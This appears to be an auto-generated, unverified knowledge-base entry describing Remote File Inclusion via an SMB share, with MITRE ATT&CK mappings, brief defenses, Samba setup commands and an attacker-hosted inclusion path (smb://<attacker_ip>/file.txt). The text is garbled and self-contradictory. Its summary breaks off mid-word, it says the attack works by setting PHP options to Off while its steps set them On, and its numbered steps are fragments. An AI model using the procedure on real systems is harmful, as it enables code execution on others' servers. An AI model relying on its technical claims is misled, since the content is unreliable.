---
id: dd7b9859-cd98-4c92-bfb5-6ae41806bafb
name: Remote File Inclusion via SMB
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:55:58.259233+00:00'
updated_at: '2023-04-10T20:22:12.051162+00:00'
tactics:
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]'
- '[[Remote Services|T1021 - Remote Services]]'
tags:
- '[[Basic RFI]]'
- '[[Bypass allow_url_include]]'
- '[[File Inclusion]]'
commands:
- '[[Configure Samba]]'
- '[[Create a Samba User]]'
- '[[Enable allow_url_fopen]]'
- '[[Enabling allow_url_include]]'
- '[[Install Samba]]'
- '[[Restart Samba Service]]'
---

# Remote File Inclusion via SMB

## Summary

Remote File Inclusion (RFI) via SMB is a technique used by attackers to execute malicious code on a target system by including a remote file hosted on a SMB share. Attackers can use this technique to bypass allow_url_include and allow_url_fopen restrictions. By setting allow_url_include and allow_u

## Description

# Description

Remote File Inclusion (RFI) via SMB is a technique used by attackers to execute malicious code on a target system by including a remote file hosted on a SMB share. Attackers can use this technique to bypass allow_url_include and allow_url_fopen restrictions. By setting allow_url_include and allow_url_fopen to Off, the attacker can force the vulnerable application to include the remote file via SMB. This technique can be used to gain access to sensitive data, execute arbitrary code, or escalate privileges.

From a technical perspective, the attacker can use a specially crafted URL to include the remote file via SMB. This technique works on Windows systems where SMB is enabled and the target system has access to the SMB share. The attacker can use this technique to execute code on the target system, which can lead to a full compromise of the system.

From a business perspective, this technique can be used by attackers to gain access to sensitive data, execute arbitrary code, or escalate privileges. This can result in financial losses, reputational damage, and legal liabilities for the affected organization.

## Requirements

1. Access to a vulnerable application that includes remote files via SMB

1. Access to a SMB share

## Defense

1. Disable SMB if it is not needed

1. Implement network segmentation to limit access to SMB shares

1. Monitor network traffic for SMB-related activity

## Objectives

1. Gain access to sensitive data

1. Execute arbitrary code

1. Escalate privileges

# Instructions

1. On

**Code**: [[allow_url_include]]

> the vulnerable application is allowed to include remote files via URLs.

**Command** ([[Enabling allow_url_include]]):

```bash
allow_url_include = On
```

2. On

**Code**: [[allow_url_fopen]]

> the vulnerable application is allowed to open remote files via URLs.

**Command** ([[Enable allow_url_fopen]]):

```bash
allow_url_fopen = On
```

3. smb://<attacker_ip>/file.txt

**Code**: [[smb]]

> command. This command includes the remote file located at smb://<attacker_ip>/file.txt

**Command** ([[Install Samba]]):

```bash
sudo apt-get install samba
```

**Command** ([[Configure Samba]]):

```bash
sudo nano /etc/samba/smb.conf
```

**Command** ([[Create a Samba User]]):

```bash
sudo smbpasswd -a username
```

**Command** ([[Restart Samba Service]]):

```bash
sudo service smbd restart
```

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]
- [[Remote Services|T1021 - Remote Services]]

## Commands Used

- [[Configure Samba]]
- [[Create a Samba User]]
- [[Enable allow_url_fopen]]
- [[Enabling allow_url_include]]
- [[Install Samba]]
- [[Restart Samba Service]]

## Tags

- [[Basic RFI]]
- [[Bypass allow_url_include]]
- [[File Inclusion]]
